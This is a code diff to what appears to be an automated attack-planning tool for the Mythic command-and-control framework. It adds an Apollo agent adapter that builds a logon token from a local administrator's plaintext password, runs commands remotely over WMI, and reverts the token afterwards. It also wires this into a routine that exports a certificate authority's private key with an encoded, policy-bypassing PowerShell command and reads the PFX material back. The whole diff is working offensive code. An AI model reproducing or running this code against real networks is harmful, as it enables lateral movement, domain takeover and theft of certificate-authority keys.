@@ -128,7 +128,22 @@ MERLIN_MYTHIC_ADAPTER: dict[str, Any] = {
     "suppress_remote_file_read": True,
 }
 
+APOLLO_MYTHIC_ADAPTER: dict[str, Any] = {
+    "payload_type": "apollo",
+    # Apollo's explicit-credential wmiexecute path uses System.Management and can
+    # activate DCOM below packet integrity on hardened targets. The token branch
+    # uses Apollo's manual CoCreateInstanceEx path with PKT_PRIVACY and survives
+    # the same hardening policy.
+    "local_admin_remote_exec_command": "wmiexecute",
+    "local_admin_remote_exec_use_token_context": True,
+    "adcs_ca_export_use_token_context": True,
+    "local_admin_context_command": "make_token",
+    "make_token_use_credential_object": True,
+    "local_admin_remote_exec_cleanup_command": "rev2self",
+}
+
 _PAYLOAD_TYPE_ADAPTERS: dict[str, dict[str, Any]] = {
+    "apollo": APOLLO_MYTHIC_ADAPTER,
     "merlin": MERLIN_MYTHIC_ADAPTER,
 }
 
@@ -1687,6 +1702,20 @@ def _local_admin_remote_command(step: Any, config: dict[str, Any]) -> MythicCapa
             missing=["local_admin_remote_exec_command"],
             reason="local-admin remote execution adapter needs a Mythic command",
         )
+    if (
+        _normalize(command) in {"wmiexec", "wmiexecute"}
+        and _input_bool(config, "local_admin_remote_exec_use_token_context", default=False)
+    ):
+        return _local_admin_token_wmiexecute_commands(
+            step,
+            config,
+            parameters,
+            command,
+            host,
+            local_account,
+            password,
+            command_text,
+        )
     if _normalize(command) in {"execute_assembly", "inline_assembly", "execute-assembly"}:
         tool_name = _adapter_text(config, "remote_exec_tool", "SharpExec.exe")
         method = _normalize(parameters.get("method") or "wmiexec")
@@ -1749,6 +1778,61 @@ def _local_admin_remote_command(step: Any, config: dict[str, Any]) -> MythicCapa
     return MythicCapabilityCommandPlan(True, commands=[
         _command_from_step(step, command, mythic_parameters, produces=["remote_process_created"]),
     ])
+
+
+def _local_admin_token_wmiexecute_commands(
+    step: Any,
+    config: dict[str, Any],
+    parameters: dict[str, Any],
+    command: str,
+    host: str,
+    local_account: str,
+    password: str,
+    command_text: str,
+    *,
+    expected_probe: str | None = None,
+    purpose: str | None = None,
+) -> MythicCapabilityCommandPlan:
+    realm = _text(parameters.get("local_realm") or parameters.get("realm") or _short_host(host))
+    principal = local_account if ("\\" in local_account or "@" in local_account) else f"{realm}\\{local_account}"
+    capability = _text(getattr(step, "capability", ""))
+    prerequisites = list(getattr(step, "prerequisites", []) or [])
+    commands: list[MythicCapabilityCommand] = []
+    if not _input_bool(config, "local_admin_remote_exec_reuse_token_context", default=False):
+        make_token = _adapter_text(config, "local_admin_context_command", _adapter_text(config, "make_token_command", "make_token"))
+        if not make_token:
+            return MythicCapabilityCommandPlan(
+                False,
+                missing=["local_admin_context_command"],
+                reason="token-backed Apollo WMI execution needs a local-admin context command",
+            )
+        commands.append(
+            MythicCapabilityCommand(
+                command=make_token,
+                parameters=_make_token_parameters(config, principal, local_account, realm, password),
+                capability=capability,
+                purpose="create a network logon context for hardened Apollo WMI activation",
+                expected_probe="",
+                prerequisites=prerequisites,
+                produces=["local_admin_logon_context"],
+            )
+        )
+    commands.append(
+        MythicCapabilityCommand(
+            command=command,
+            parameters={
+                _adapter_text(config, "remote_exec_command_param", "command"): command_text,
+                _adapter_text(config, "remote_exec_host_param", "host"): host,
+            },
+            capability=capability,
+            purpose=_text(getattr(step, "purpose", "")) if purpose is None else purpose,
+            expected_probe=_text(getattr(step, "expected_probe", "")) if expected_probe is None else expected_probe,
+            prerequisites=prerequisites,
+            consumes=["local_admin_logon_context"],
+            produces=["remote_process_created"],
+        )
+    )
+    return MythicCapabilityCommandPlan(True, commands=commands)
 
 
 def _native_windows_remote_exec_run_commands(
@@ -2227,7 +2311,7 @@ def _remote_file_read_command(step: Any, config: dict[str, Any]) -> MythicCapabi
             reason="remote file read adapter needs a Mythic command",
         )
     path_param = _adapter_text(config, "remote_file_read_path_param", _adapter_text(config, "file_read_path_param", "path"))
-    return MythicCapabilityCommandPlan(True, commands=[
+    commands = [
         _command_from_step(
             step,
             command,
@@ -2236,7 +2320,28 @@ def _remote_file_read_command(step: Any, config: dict[str, Any]) -> MythicCapabi
             produces=["remote_execution_proof"],
             deferred="{{" in path,
         ),
-    ])
+    ]
+    commands.extend(_local_admin_cleanup_commands(step, config))
+    return MythicCapabilityCommandPlan(True, commands=commands)
+
+
+def _local_admin_cleanup_commands(step: Any, config: dict[str, Any]) -> list[MythicCapabilityCommand]:
+    cleanup_command = _adapter_text(config, "local_admin_remote_exec_cleanup_command", "")
+    if not cleanup_command:
+        return []
+    return [
+        MythicCapabilityCommand(
+            command=cleanup_command,
+            parameters={},
+            capability=_text(getattr(step, "capability", "")),
+            purpose="revert from the local-admin network logon context after proof readback",
+            expected_probe="",
+            operation="local-admin-logon-session-revert",
+            prerequisites=[],
+            consumes=["local_admin_logon_context"],
+            produces=[],
+        )
+    ]
 
 
 def _endpoint_protection_adjustment_command(step: Any, config: dict[str, Any]) -> MythicCapabilityCommandPlan:
@@ -2581,6 +2686,42 @@ def _adcs_ca_private_key_export_command(step: Any, config: dict[str, Any]) -> My
         encoded = base64.b64encode(remote_script.encode("utf-16le")).decode("ascii")
         remote_command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand " + encoded
         metadata_unc = _unc_from_windows_path(host, metadata_path)
+        if _input_bool(
+            config,
+            "adcs_ca_export_use_token_context",
+            default=_input_bool(config, "local_admin_remote_exec_use_token_context", default=False),
+        ):
+            token_plan = _local_admin_token_wmiexecute_commands(
+                step,
+                config,
+                parameters,
+                command,
+                host,
+                local_account,
+                password,
+                remote_command,
+                expected_probe="",
+                purpose=f"launch ADCS CA private-key export on {target_host}@{target_domain}",
+            )
+            if not token_plan.ok:
+                return token_plan
+            commands = list(token_plan.commands)
+            commands.append(
+                MythicCapabilityCommand(
+                    command=_adapter_text(config, "remote_file_read_command", _adapter_text(config, "file_read_command", "cat")),
+                    parameters={
+                        _adapter_text(config, "remote_file_read_path_param", _adapter_text(config, "file_read_path_param", "path")): metadata_unc,
+                    },
+                    capability=capability,
+                    purpose=f"read ADCS CA export metadata and PFX material from {metadata_unc}",
+                    expected_probe="extract_adcs_ca_private_key_probe",
+                    prerequisites=prerequisites,
+                    consumes=["local_admin_logon_context", "remote_process_created"],
+                    produces=["adcs_ca_private_key_material"],
+                )
+            )
+            commands.extend(_local_admin_cleanup_commands(step, config))
+            return MythicCapabilityCommandPlan(True, commands=commands)
         return MythicCapabilityCommandPlan(True, commands=[
             MythicCapabilityCommand(
                 command=command,
@@ -3072,6 +3213,7 @@ def _certificate_schannel_ldap_powershell(
             "$candidate.AuthType=[System.DirectoryServices.Protocols.AuthType]::External;"
             "$candidate.SessionOptions.SecureSocketLayer=[bool]$attempt.Ssl;"
             "$candidate.SessionOptions.ProtocolVersion=3;"
+            "$candidate.SessionOptions.ReferralChasing=[System.DirectoryServices.Protocols.ReferralChasingOptions]::None;"
             "$candidate.SessionOptions.VerifyServerCertificate={param($connection,$certificate) $true};"
             "$candidate.SessionOptions.QueryClientCertificate={param($connection,$trustedCAs) $clientCert};"
             "$null=$candidate.ClientCertificates.Add($cert);"
